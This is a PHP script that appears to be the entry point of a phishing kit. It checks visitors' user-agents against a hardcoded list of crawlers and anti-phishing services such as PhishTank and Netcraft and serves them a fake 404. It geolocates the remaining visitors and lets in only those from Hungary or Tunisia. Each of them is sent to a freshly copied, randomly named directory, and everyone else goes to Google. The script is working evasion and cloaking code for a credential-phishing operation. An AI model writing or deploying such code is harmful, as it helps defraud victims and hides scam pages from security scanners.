<?php
session_start();
include('data/Crypt.php');
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot',
        'google',
        'Baiduspider',
        'ia_archiver',
        'R6_FeedFetcher',
        'NetcraftSurveyAgent',
        'Sogou web spider',
        'bingbot',
        'Yahoo! Slurp',
        'facebookexternalhit',
        'PrintfulBot',
        'msnbot',
        'Twitterbot',
        'UnwindFetchor',
        'urlresolver',
        'Butterfly',
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		    'phishtank',
		    'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google',
        'Spinn3r',
        'InAGist',
        'Python-urllib',
        'NING',
        'TencentTraveler',
        'Feedfetcher-Google',
        'mon.itor.us',
        'spbot',
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
function recurse_copy($toc,$cop) {
  $dir = opendir($toc);
  @mkdir($cop);
  while(false !== ( $file = readdir($dir)) ) {
    if (( $file != '.' ) && ( $file != '..' )) {
      if ( is_dir($toc . '/' . $file) ) {
        recurse_copy($toc . '/' . $file,$cop . '/' . $file);
      }
      else {
        copy($toc . '/' . $file,$cop . '/' . $file);
      }
    }
  }
  closedir($dir);
}
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo MHT_ENCODING("404 NOT FOUND");
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'];
	$url = "http://ip-api.com/json/$ip";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
	$data = json_decode($data, true);

	$ccode = $data['countryCode'];
	if($ccode == "HU" || $ccode == "TN"){
		$_SESSION['access'] = true;
		$_SESSION['try'] = "1";
		$dist = "webapp/".generateRandomString(32);
		$src="data";

		recurse_copy( $src, $dist );
		header("LOCATION: ".$dist."");

	}
	else{
		$_SESSION['access'] = false;
header('location:https://www.google.com');

	}
?>